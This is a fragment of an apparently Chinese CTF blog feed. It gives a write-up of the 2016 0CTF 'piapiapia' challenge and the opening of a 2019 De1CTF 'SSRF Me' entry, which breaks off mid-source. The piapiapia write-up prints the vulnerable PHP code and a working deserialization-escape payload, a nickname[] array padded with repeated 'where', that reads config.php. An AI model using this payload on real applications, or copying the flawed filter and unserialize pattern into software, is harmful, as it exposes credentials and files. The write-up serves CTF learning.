class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">        $value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        $object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">        <span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">        $username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">        $new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">        $where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">            $config[<span class="string">'hostname'</span>],</span><br><span class="line">            $config[<span class="string">'username'</span>], </span><br><span class="line">            $config[<span class="string">'password'</span>]</span><br><span class="line">        );</span><br><span class="line">        mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">        $result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">        $key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">        $value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">        $sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">        $sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">        <span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">        $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);       <span class="comment">#\   \\ </span></span><br><span class="line">        $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">        $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">        $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">        $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure><p>update.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">        $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">        $file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">        <span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">        $profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">        $profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">        $profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        $profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">        $user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login First'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $profile=$user-&gt;show_profile($username);</span><br><span class="line">    <span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">        header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $profile = unserialize($profile);</span><br><span class="line">        $phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">        $email = $profile[<span class="string">'email'</span>];</span><br><span class="line">        $nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">        $photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析如下:</p><p>photo来自profile，在profile.php中我们可以发现photo的显示其实是读取了该用户的profile</p><p><code>$profile=$user-&gt;show_profile($username);</code></p><p>那么肯定有某处是执行函数存储了该用户的profile</p><p>在update.php中我们可以看到这些设置profile的操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br></pre></td></tr></table></figure><p>在profile.php中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Login First'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">$profile=$user-&gt;show_profile($username);</span><br><span class="line"><span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$profile = unserialize($profile);</span><br><span class="line">$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>该逻辑是，对于登录的用户跳转至profile.php，如果profile没有设置，则跳转至update.php进行profile的设置，否则就显示出profile的内容。</p><p>那么这里就很好理解了，初次登录，控制profile的photo，再次登录让它回显出config.php的base64内容</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>反序列化逃逸</strong></p><p>在update.php中有这么一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure><p>即存储了profile的序列化，但是这里的update_profile函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了filter函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fileter函数中进行了对单引号、双反斜杠的过滤，以及将select、insert、update、delete、where字符串替换成hacker。这里就会出现一个问题，只有where是长度为5的字符串，即如果字符串中有where会被替换成字符串长度为6的hacker字符串。</p><p>来看一下一个在线测试</p><p><img src="2016-0CTF—piapiapia/1.png" alt=""></p><p>对于<code>unserialize()</code>而言，这个函数会忽略能够正常序列化的字符串后面的字符串</p><p>上图也可以看出来，s:10:”hacker1234”就已经符合了正常的序列化，因此后续的字符串被忽略</p><p>而如果字符串中有where字符，由于是先反序列化后进行的过滤操作，导致会逃逸出一个字符。对于photo而言，我们是否能够想办法在前面的某些参数位置处产生溢出，从而控制后面的photo参数呢？（正常的序列化后的结果中，photo是最后一个参数）</p><p>来看update.php中的初始化profile操作</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure><p>对于nickname这个参数，看到熟悉的preg_match和strlen，都可以用数组绕过，于是nickname就完全可控</p><p>来看一下测试</p><p><img src="2016-0CTF—piapiapia/5.png" alt=""></p><p>可以发现如果对nickname中输入了where，unserialize()会报错，因为长度不匹配构不成完整的正常序列化。</p><p>（实际注册账号填入信息试了一下，果真会报错，而不输入黑名单字符则会正常回显profile）</p><p>那么我们接下来就构造特殊的payload让其在逃逸后变成正常的序列化同时又满足读出config内容。</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php</span><br></pre></td></tr></table></figure><p><img src="2016-0CTF—piapiapia/6.png" alt=""></p><p>因为我们需要闭合填充的字符串为<code>&quot;;}s:5: &quot;photo&quot;;s:10: &quot;config.php</code></p><p>一共多出来31个字符，因此前面需要31个where</p><p>也可以填充<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>（后面有原本的闭合，也可以自己添加，反正后续多余的会被忽略）,此时需要34个where</p><p><img src="2016-0CTF—piapiapia/7.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019De1CTF—SSRF-Me</title>
      <link href="/2019/09/11/2019De1CTF%E2%80%94SSRF-Me/"/>
      <url>/2019/09/11/2019De1CTF%E2%80%94SSRF-Me/</url>
      
        <content type="html"><![CDATA[<h1 id="2019De1CTF—SSRF-Me"><a href="#2019De1CTF—SSRF-Me" class="headerlink" title="2019De1CTF—SSRF Me"></a>2019De1CTF—SSRF Me</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ul><li>查看页面源代码即可拿到正确格式的源代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span 